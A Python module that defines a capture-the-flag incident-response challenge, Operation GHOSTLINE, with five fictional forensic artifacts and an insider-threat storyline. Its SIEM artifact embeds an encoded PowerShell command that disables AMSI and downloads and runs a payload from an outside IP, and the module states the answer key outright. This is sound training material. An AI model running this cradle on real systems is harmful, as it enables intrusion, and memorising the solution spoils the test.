"""Operation GHOSTLINE — built-in mega challenge.

A multi-stage APT incident investigation requiring SOC, IR, pentest,
red-team / threat-intel, and DFIR skills.  Five artifacts, five keywords,
one passphrase — and an insider-threat twist that ties the whole
narrative together.

Solution: BREACH-PIVOT-SHELL-STORM-GHOST
"""
from __future__ import annotations

MEGA_CHALLENGE_SOLUTION = "BREACH-PIVOT-SHELL-STORM-GHOST"

MEGA_CHALLENGE_REWARD_TIERS = [15, 10, 5, 5]

MEGA_CHALLENGE_DESCRIPTION = r"""## CLASSIFIED // OPERATION GHOSTLINE // TLP:RED

**INCIDENT BRIEFING — FOR IMMEDIATE ANALYSIS**

At 0214 UTC, automated detection flagged anomalous activity on host
WS-FIN042 in the Finance VLAN.  Initial triage suggests a sophisticated
threat actor with command-and-control capability already established
inside your network.

The attacker navigated directly to sensitive internal systems that
aren't discoverable from the outside.  They knew which hosts to
target, which credentials to use, and which monitoring gaps to
exploit.  Your CISO suspects an insider may be feeding intelligence
to the threat actor — or worse, the threat actor may BE an insider.

**YOUR MISSION:** Analyse the five evidence artifacts below.  Each
conceals a single **KEYWORD**.  Extract all five keywords and submit
them as a single passphrase to close the case.

> **Format:** `KEYWORD1-KEYWORD2-KEYWORD3-KEYWORD4-KEYWORD5`
> All uppercase, separated by hyphens.

Time is critical.  The attacker is still active.

---

### ARTIFACT 1 — SIEM ALERT TRIAGE  *(SOC Analyst)*

Your SIEM exported the following process-creation events from
WS-FIN042 during the incident window.  Identify the attacker's
execution and extract the hidden keyword from their payload.

```
EVENT A — 02:13:55 UTC
  EventID    : 4688 (Process Create)
  User       : CORP\svc_backup
  Process    : powershell.exe
  Parent     : taskschd.exe
  CommandLine: powershell.exe -ExecutionPolicy Bypass
               -File C:\Scripts\nightly_backup.ps1

EVENT B — 02:14:02 UTC
  EventID    : 4688 (Process Create)
  User       : SYSTEM
  Process    : MsMpEng.exe
  Parent     : services.exe
  CommandLine: "C:\ProgramData\Microsoft\Windows Defender\
               platform\4.18.24070.5-0\MsMpEng.exe"

EVENT C — 02:14:12 UTC
  EventID    : 4688 (Process Create)
  User       : SYSTEM
  Process    : wuauclt.exe
  Parent     : svchost.exe
  CommandLine: wuauclt.exe /detectnow /updatenow

EVENT D — 02:14:33 UTC
  EventID    : 4688 (Process Create)
  User       : CORP\svc_backup
  Process    : powershell.exe
  Parent     : cmd.exe
  CommandLine: powershell.exe -ep bypass -nop -sta
               JABhAD0AWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5
               AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0A
               LgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBt
               AGEAdABpAG8AbgAuACcAKwBbAGMAaABhAHIAXQA2ADUA
               KwAnAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAGYAPQAk
               AGEALgBHAGUAdABGAGkAZQBsAGQAKAAnAGEAbQBzAGkA
               JwArACcASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBO
               AG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcA
               KQA7ACQAZgAuAFMAZQB0AFYAYQBsAHUAZQAoACQAbgB1
               AGwAbAAsACQAdAByAHUAZQApADsAJABjAD0ATgBlAHcA
               LQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBs
               AGkAZQBuAHQAOwAkAGMALgBIAGUAYQBkAGUAcgBzAC4A
               QQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAs
               ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACcAKQA7ACQAYw
               AuAFAAcgBvAHgAeQA9AFsATgBlAHQALgBXAGUAYgBSAG
               UAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVw
               BlAGIAUAByAG8AeAB5ADsAJABjAC4AUAByAG8AeAB5AC
               4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdA
               AuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF
               0AOgA6AEQAZQBmAGEAdQBsAHQATgBlAHQAdwBvAHIAaw
               BDAHIAZQBkAGUAbgB0AGkAYQBsAHMAOwAkAGIAPQAkAG
               MALgBEAG8AdwBuAGwAbwBhAGQARABhAHQAYQAoACcAaA
               B0AHQAcABzADoALwAvADEAOAA1AC4AMgAyADAALgAxAD
               AAMQAuADMANAA6ADgANAA0ADMALwBCAFIARQBBAEMASA
               AvAHMAdABhAGcAZQAyAC4AYgBpAG4AJwApADsAJAByAD
               0AWwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQ
               BtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAAkAGIAKQA7AC
               QAcgAuAEUAbgB0AHIAeQBQAG8AaQBuAHQALgBJAG4Adg
               BvAGsAZQAoACQAbgB1AGwAbAAsAFsAbwBiAGoAZQBjAH
               QAWwBdAF0AQAAoACkAKQA=

EVENT E — 02:14:41 UTC
  EventID    : 4688 (Process Create)
  User       : SYSTEM
  Process    : sc.exe
  Parent     : services.exe
  CommandLine: sc.exe start spooler

EVENT F — 02:14:58 UTC
  EventID    : 4688 (Process Create)
  User       : CORP\j.martinez
  Process    : python3.exe
  Parent     : WindowsTerminal.exe
  CommandLine: python3.exe C:\Users\j.martinez\scripts\log_rotate.py

EVENT G — 02:15:03 UTC
  EventID    : 4688 (Process Create)
  User       : SYSTEM
  Process    : svchost.exe
  Parent     : services.exe
  CommandLine: svchost.exe -k netsvcs -p -s Schedule

EVENT H — 02:15:18 UTC
  EventID    : 4688 (Process Create)
  User       : CORP\svc_monitor
  Process    : cscript.exe
  Parent     : taskschd.exe
  CommandLine: cscript.exe //nologo C:\Monitoring\health_check.vbs
```

**KEYWORD 1 is concealed within the attacker's payload.**

---

### ARTIFACT 2 — NETWORK TRAFFIC ANALYSIS  *(Incident Response)*

Firewall and DNS logs from the compromised VLAN during the incident
window.  Identify the command-and-control infrastructure and extract
the covert data drop.

```
Timestamp      Act    Proto  Source         Destination            Info
--------------------------------------------------------------------
02:13:01       ALLOW  TCP    10.0.4.217     20.190.159.2:443       TLS 1.3 (login.microsoftonline.com)
02:13:15       ALLOW  TCP    10.0.4.55      104.16.132.229:443     TLS 1.3 (Cloudflare CDN)
02:13:22       ALLOW  UDP    10.0.4.217     8.8.8.8:53             DNS A? google.com
02:13:30       ALLOW  UDP    10.0.4.217     8.8.8.8:53             DNS A? wpad.corp.local [NXDOMAIN]
02:14:02       ALLOW  TCP    10.0.4.217     20.191.45.212:443      TLS 1.3 (settings-win.data.microsoft.com)
02:14:33       ALLOW  TCP    10.0.4.217     45.33.32.156:443       TLS 1.2 (scanme.nmap.org)
02:14:41       ALLOW  UDP    10.0.4.217     8.8.8.8:53             DNS A? cdn-update.darkpulse.io -> 185.220.101.34
02:14:55       ALLOW  TCP    10.0.4.217     185.220.101.34:443     TLS 1.2 ClientHello (SNI: cdn-update.darkpulse.io)
02:15:01       ALLOW  TCP    10.0.4.217     185.220.101.34:8443    SYN -> ESTABLISHED
02:15:22       ALLOW  UDP    10.0.4.217     8.8.8.8:53             DNS TXT? cdn-update.darkpulse.io
02:15:45       ALLOW  UDP    10.0.4.217     8.8.8.8:53             DNS A? time.windows.com
02:16:10       ALLOW  TCP    10.0.4.217     40.119.6.228:443       TLS 1.3 (ocsp.digicert.com)
02:16:44       ALLOW  TCP    10.0.4.217     10.0.1.5:445           SMB3 negotiate
02:17:11       DENY   TCP    10.0.4.217     10.0.1.5:3389          RST (GPO block)
02:17:33       ALLOW  TCP    10.0.4.217     10.0.1.12:5985         WinRM session established
02:17:55       ALLOW  UDP    10.0.4.217     8.8.8.8:53             DNS A? update.googleapis.com
02:18:02       ALLOW  TCP    10.0.1.12      10.0.2.8:22            SSH KEX INIT
02:18:30       ALLOW  TCP    10.0.4.55      104.16.133.229:443     TLS 1.3 (Cloudflare CDN continued)
02:19:15       ALLOW  TCP    10.0.2.8       185.220.101.34:443     TLS 1.2 ClientHello (SNI: cdn-update.darkpulse.io)
02:19:44       ALLOW  TCP    10.0.4.217     20.190.159.2:443       TLS 1.3 (token refresh)
02:20:01       ALLOW  UDP    10.0.4.217     8.8.8.8:53             DNS A? github.com
02:20:15       ALLOW  TCP    10.0.4.217     140.82.121.4:443       TLS 1.3 (github.com)
```

The pivot path is clear: `10.0.4.217` → `10.0.1.12` (WinRM) →
`10.0.2.8` (SSH) → C2 callback.  The attacker had credentials for
machines they shouldn't know about.

Your DNS team pulled the full record set for the C2 domain:

```
;; ANSWER SECTION:
cdn-update.darkpulse.io.  300  IN  A      185.220.101.34
cdn-update.darkpulse.io.  300  IN  AAAA   2606:4700:3030::ac43:8522
cdn-update.darkpulse.io.  300  IN  MX     10 mail.darkpulse.io.
cdn-update.darkpulse.io.  300  IN  TXT    "v=spf1 include:_spf.darkpulse.io ~all"
cdn-update.darkpulse.io.  300  IN  TXT    "google-site-verification=Xk7mQnR2pT0zA9Lv"
cdn-update.darkpulse.io.  300  IN  TXT    "v=DKIM1; k=rsa; p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC7"
cdn-update.darkpulse.io.  300  IN  TXT    "5049564f54"
cdn-update.darkpulse.io.  300  IN  NS     ns1.darkpulse.io.
cdn-update.darkpulse.io.  300  IN  NS     ns2.darkpulse.io.
```

One of these records doesn't belong.

**KEYWORD 2 is hidden in the DNS records.**

---

### ARTIFACT 3 — C2 SERVER RECONNAISSANCE  *(Penetration Tester)*

Your red team obtained access to the C2 at `185.220.101.34` and
captured the following HTTP exchange from its agent check-in API:

```
=== REQUEST ===
POST /api/v2/agent/checkin HTTP/1.1
Host: cdn-update.darkpulse.io:8443
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1)
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZ2VudC00NzcxIiwiaXNzIjoiY2RuLXVwZGF0ZS5kYXJrcHVsc2UuaW8iLCJpYXQiOjE3MTA0MzI3MjAsImV4cCI6MTcxMDQzNjMyMCwianRpIjoiYThmM2JjOWQtMWUyZi00YTViLTljM2QtN2U4ZjBhMWIyYzNkIiwib3AiOiJTSEVMTCIsInRpZCI6IldTLUZJTjA0MiIsInVpZCI6NDA3NzEsInByaXYiOjMsInBpcGUiOiJtc2FnZW50XzEyIn0.K7xM2pQn9vR3bY5wL1zA4cF6dH8jN0mT2sE4uG6iW8o

{"beacon_id": "4771", "hostname": "WS-FIN042", "internal_ip": "10.0.4.217",
 "os": "Windows 10 Enterprise 22H2", "integrity": "high", "user": "CORP\\svc_backup"}

=== RESPONSE ===
HTTP/1.1 200 OK
Server: Apache/2.4.49 (Unix)
X-Powered-By: PHP/7.4.3
Content-Type: application/json
Set-Cookie: SESSID=a8f3bc9d; Path=/; HttpOnly; Secure

{"status": "ok", "sleep": 60, "jitter": 15, "tasks": []}
```

The server is running Apache/2.4.49 — vulnerable to CVE-2021-41773
(path traversal to RCE).  But the keyword is not in the server's
filesystem.  It's already in this traffic capture.

**KEYWORD 3 is embedded in the authentication exchange.**

---

### ARTIFACT 4 — THREAT INTELLIGENCE  *(Red Team / Intel Analyst)*

Your threat-intel platform matched the C2 infrastructure to a tracked
adversary group.

```
========== CIRCL MISP FEED — EVENT 2024-18442 ==========
Adversary         : APT-7291  (aliases: DARKPULSE, SILENT TYPHOON)
TLP               : AMBER
Confidence        : HIGH
IOCs              : 185.220.101.34, cdn-update.darkpulse.io
MITRE ATT&CK      : T1059.001, T1071.004, T1041, T1078.002
Campaign Cipher   : SIHRB
Cipher Note       : Group uses polyalphabetic substitution.
                    Key is derived from the group's primary
                    three-letter designation.
Compilation TS    : 2024-03-14T16:32:00-05:00
PDB Debug Path    : C:\Users\mhawkins\Dev\ghostline\beacon.pdb
Mutex             : Global\{5E8A1F23-7C4D-4B2A-9E6F-1A3D5B7C9E0F}
=========================================================
```

The adversary encrypts their operational codenames.

**KEYWORD 4 is the decrypted campaign name.**

> Note the PDB debug path: `C:\Users\mhawkins\Dev\ghostline\`.
> This malware was compiled on someone's Windows workstation.
> Cross-reference this with Artifact 3's access logs.

---

### ARTIFACT 5 — MALWARE FORENSICS  *(DFIR / Reverse Engineer)*

Volatility extracted the beacon configuration from the WS-FIN042
memory dump:

```
========= BEACON CONFIG (imagebase 0x7FFA200) =========
beacon_type    : HTTPS
c2_server      : cdn-update.darkpulse.io
c2_port        : 8443
sleep_interval : 60
jitter_pct     : 15
user_agent     : Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1)
spawn_to_x86   : %windir%\syswow64\rundll32.exe
spawn_to_x64   : %windir%\sysnative\rundll32.exe
watermark      : 0x5E8A1F23
named_pipe     : \\.\pipe\msagent_##
process_inject : ntdll!RtlUserThreadStart
cleanup        : true
```

```
========= ENCRYPTED FIELDS (raw hex) ==================
enc_campaign   : 64 6b 6c 70 77
enc_operator   : 11 09 00 0f 15 0e 0c
enc_exfil_uri  : 44 50 50 43 46 12 17 17
========================================================
```

Multiple fields are encrypted.  The encryption key is not stored
alongside the data — it's embedded elsewhere in the config.  Beacon
frameworks typically derive their field-encryption key from a fixed
value in the configuration itself.

**KEYWORD 5 is one of the decrypted fields above.**

---

### CASE FILE SUMMARY

Assemble the evidence.

The PDB path names `mhawkins`.  The compilation timestamp places
the build during business hours at HQ.  The agent's `uid` field
matches badge number 40771.  The hijacked service account
`svc_backup`?  Hawkins administered it.  The SSH credentials for
the Linux jump box at 10.0.2.8?  Hawkins configured that server
last quarter.

Cross-referencing HR records:

```
HAWKINS, MARCUS J.
Department  : Cyber Threat Intelligence
Clearance   : TS/SCI
Badge #     : 40771
Start Date  : 2019-06-03
Supervisor  : REDACTED
```

Your own Threat Intelligence analyst leveraged their clearance and
knowledge of your defensive monitoring to engineer an attack chain
designed to look like a foreign APT.

**GHOSTLINE was never an outside threat.  It was an inside job.**

---

### SUBMIT YOUR FINDINGS

> **KEYWORD1-KEYWORD2-KEYWORD3-KEYWORD4-KEYWORD5**
>
> All uppercase.  Hyphens between each word.  First team to submit
> the correct passphrase earns maximum influence for their nation.
""".strip()
